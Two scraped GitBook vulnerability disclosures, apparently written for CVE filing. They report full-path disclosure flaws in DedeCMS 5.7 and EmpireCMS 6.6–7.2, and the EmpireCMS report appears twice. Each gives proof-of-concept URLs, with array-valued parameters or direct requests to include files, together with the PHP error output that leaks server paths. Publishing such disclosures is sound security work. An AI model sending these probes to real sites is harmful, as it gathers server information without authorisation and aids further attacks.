=== Content from kongxin.gitbook.io_a64f5d8e_20250124_232247.html ===
[![](https://kongxin.gitbook.io/~gitbook/image?url=https%3A%2F%2Fkongxin.gitbook.io%2Fdedecms-5-7-bug%2F%7Egitbook%2Ficon%3Fsize%3Dmedium%26theme%3Dlight&width=32&dpr=4&quality=100&sign=420faabf&sv=2)![](https://kongxin.gitbook.io/~gitbook/image?url=https%3A%2F%2Fkongxin.gitbook.io%2Fdedecms-5-7-bug%2F%7Egitbook%2Ficon%3Fsize%3Dmedium%26theme%3Ddark&width=32&dpr=4&quality=100&sign=b648322f&sv=2)DedeCMS\_5.7\_Bug](/dedecms-5-7-bug)Search...Ctrl + K

* [DedeCMS\_5.7\_Bug](/dedecms-5-7-bug)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=-Mia1T2VMJrbhvotPdcq)On this page

Was this helpful?

# DedeCMS\_5.7\_Bug

DedeCMS 5.7 Bug

> [Suggested description] DedeCMS 5.7 allows remote attackers to discover the full path via a direct request for include/downmix.inc.php or inc/inc\_archives\_functions.php.
>
> [Additional Information]
> Fix suggestions:
> Modify the application source code to avoid information leakage.
>
> The vulnerability was discovered by downloading the program's source code to local and online deployment tests.
>
> Location: include/downmix.inc.php
>
> Code:
>
> helper('downmix');
>
> Rows:13
>
> Return error :
>
> Fatal error: Call to undefined function helper() in /www/include/downmix.inc.php on line 13
>
> Harm:
>
> Web site physical path leakage .
>
> conditions for execution:
>
> Normal access can
>
> Edition:
>
> DedeCMS 5.7
>
> Cause the cause :
>
> Call to undefined function helper(), cause path leakage
>
> POC : <http://127.0.0.1/include/downmix.inc.php>
>
> Location: /dede/inc/inc\_archives\_functions.php
>
> Code:
>
> require\_once(DEDEINC.'/dedehttpdown.class.php');
>
> Rows:11
>
> Return error :
>
> Notice: Use of undefined constant DEDEINC - assumed 'DEDEINC' in /www/dede/inc/inc\_archives\_functions.php on line 11
> Warning: require\_once(DEDEINC/dedehttpdown.class.php): failed to open stream: No such file or directory in /www/dede/inc/inc\_archives\_functions.php on line 11
> Fatal error: require\_once(): Failed opening required 'DEDEINC/dedehttpdown.class.php' (include\_path='.;C:\php\pear') in /www/dede/inc/inc\_archives\_functions.php on line 11
>
> Harm:
>
> Web site physical path leakage .
>
> conditions for execution:
>
> Normal access can
>
> Edition:
>
> DedeCMS 5.7
>
> Cause the cause :
>
> require\_once(): Failed opening required 'DEDEINC/dedehttpdown.class.php' (include\_path='.;C:\php\pear') , cause path leakage
>
> POC : <http://127.0.0.1/dede/inc/inc_archives_functions.php>
>
> [VulnerabilityType Other]
> Physical path leaks
>
> [Vendor of Product]
> dedecms
>
> [Affected Product Code Base]
> dedecms - 5.7
>
> [Affected Component]
> downmix.inc.php , Call to undefined function helper() , Web site physical path leakage
>
> [Attack Type]
> Remote
>
> [Impact Information Disclosure]
> true
>
> [Attack Vectors]
> The vulnerability can be triggered by visiting the URL below:
> <http://127.0.0.1/include/downmix.inc.php>
> <http://127.0.0.1/dede/inc/inc_archives_functions.php>
>
> [Discoverer]
> kongxin

Last updated 3 years ago



=== Content from kongxin.gitbook.io_b9c84a81_20250124_232248.html ===
[![](https://kongxin.gitbook.io/~gitbook/image?url=https%3A%2F%2Fkongxin.gitbook.io%2Fempirecms%2F%7Egitbook%2Ficon%3Fsize%3Dmedium%26theme%3Dlight&width=32&dpr=4&quality=100&sign=54cede76&sv=2)![](https://kongxin.gitbook.io/~gitbook/image?url=https%3A%2F%2Fkongxin.gitbook.io%2Fempirecms%2F%7Egitbook%2Ficon%3Fsize%3Dmedium%26theme%3Ddark&width=32&dpr=4&quality=100&sign=43d026a4&sv=2)EmpireCMS\_Bug](/empirecms)Search...Ctrl + K

* [EmpireCMS\_Bug](/empirecms)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=-Mia0Wm7SQQTJLcpizZ3)On this page

Was this helpful?

# EmpireCMS\_Bug

EmpireCMS Bug

> [Suggested description] EmpireCMS 6.6 through 7.2 allows remote attackers to discover the full path via an array value for a parameter to class/connect.php.
>
> [Additional Information] Location: EmpireCMS 6.6 : /e/admin/tool/ShowPic.php /e/class/connect.php
>
> EmpireCMS 7.0 : /e/class/connect.php
>
> EmpireCMS 7.2 : /e/class/connect.php
>
> Code: EmpireCMS 6.6 : $picurl=htmlspecialchars($\_GET['picurl']); $pic\_width=htmlspecialchars($\_GET['pic\_width']); $pic\_height=htmlspecialchars($\_GET['pic\_height']); $url=htmlspecialchars($\_GET['url']);
>
> Rows:4 Rows:5 Rows:6 Rows:7
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/admin/tool/ShowPic.php on line 4?5?6?7
>
> Code: EmpireCMS 6.6 : if($val!=addslashes($val))
>
> Rows:373
>
> Return error : addslashes() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 373
>
> Code: EmpireCMS 7.0 : $val=htmlspecialchars($val,$flags,$char);
>
> Rows:457
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 457
>
> Code: EmpireCMS 7.2 : $val=htmlspecialchars($val,$flags,$char);
>
> Rows:579
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 579
>
> Harm: Web site physical path leakage .
>
> conditions for execution: Normal access can
>
> Edition: EmpireCMS 6.6 EmpireCMS 7.0 EmpireCMS 7.2
>
> Cause the cause :
>
> htmlspecialchars() expects parameter 1 to be string,Cause the path to leak. addslashes() expects parameter 1 to be string, Cause the path to leak.
>
> POC : EmpireCMS 6.6 : <http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&> <http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&>
>
> EmpireCMS 7.0 : <http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&>
>
> EmpireCMS 7.2 : <http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&>
>
> Fix suggestions: Modify the application source code to avoid information leakage.
>
> [VulnerabilityType Other] Physical path leaks
>
> [Vendor of Product] EmpireCMS
>
> [Affected Product Code Base] EmpireCMS - 6.6 EmpireCMS - 7.0 EmpireCMS - 7.2
>
> [Affected Component] FileMain.php , ShowPic.phpe , connect.php ,htmlspecialchars() expects parameter 1 to be string, Web site physical path leakage
>
> [Attack Type] Remote
>
> [Impact Information Disclosure] true
>
> [Attack Vectors] The vulnerability can be triggered by directly accessing the URL below: EmpireCMS 6.6 : <http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&> <http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&>
>
> EmpireCMS 7.0 : <http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&>
>
> EmpireCMS 7.2 : <http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&>
>
> [Discoverer] kongxin
>
> [Suggested description] EmpireCMS 6.6 allows remote attackers to discover the full path via an array value for a parameter to admin/tool/ShowPic.php.
>
> [Additional Information] Location: EmpireCMS 6.6 : /e/admin/tool/ShowPic.php /e/class/connect.php
>
> EmpireCMS 7.0 : /e/class/connect.php
>
> EmpireCMS 7.2 : /e/class/connect.php
>
> Code: EmpireCMS 6.6 : $picurl=htmlspecialchars($\_GET['picurl']); $pic\_width=htmlspecialchars($\_GET['pic\_width']); $pic\_height=htmlspecialchars($\_GET['pic\_height']); $url=htmlspecialchars($\_GET['url']);
>
> Rows:4 Rows:5 Rows:6 Rows:7
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/admin/tool/ShowPic.php on line 4?5?6?7
>
> Code: EmpireCMS 6.6 : if($val!=addslashes($val))
>
> Rows:373
>
> Return error : addslashes() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 373
>
> Code: EmpireCMS 7.0 : $val=htmlspecialchars($val,$flags,$char);
>
> Rows:457
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 457
>
> Code: EmpireCMS 7.2 : $val=htmlspecialchars($val,$flags,$char);
>
> Rows:579
>
> Return error : htmlspecialchars() expects parameter 1 to be string, array given in /www/e/class/connect.php on line 579
>
> Harm: Web site physical path leakage .
>
> conditions for execution: Normal access can
>
> Edition: EmpireCMS 6.6 EmpireCMS 7.0 EmpireCMS 7.2
>
> Cause the cause :
>
> htmlspecialchars() expects parameter 1 to be string,Cause the path to leak. addslashes() expects parameter 1 to be string, Cause the path to leak.
>
> POC : EmpireCMS 6.6 : <http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&> <http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&>
>
> EmpireCMS 7.0 : <http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&>
>
> EmpireCMS 7.2 : <http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&>
>
> Fix suggestions: Modify the application source code to avoid information leakage.
>
> [VulnerabilityType Other] Physical path leaks
>
> [Vendor of Product] EmpireCMS
>
> [Affected Product Code Base] EmpireCMS - 6.6 EmpireCMS - 7.0 EmpireCMS - 7.2
>
> [Affected Component] FileMain.php , ShowPic.phpe , connect.php ,htmlspecialchars() expects parameter 1 to be string, Web site physical path leakage
>
> [Attack Type] Remote
>
> [Impact Information Disclosure] true
>
> [Attack Vectors] The vulnerability can be triggered by directly accessing the URL below: EmpireCMS 6.6 : <http://domain/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin&> <http://domain/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&>
>
> EmpireCMS 7.0 : <http://domain/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&>
>
> EmpireCMS 7.2 : <http://domain/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&>
>
> [Discoverer] kongxin

Last updated 3 years ago


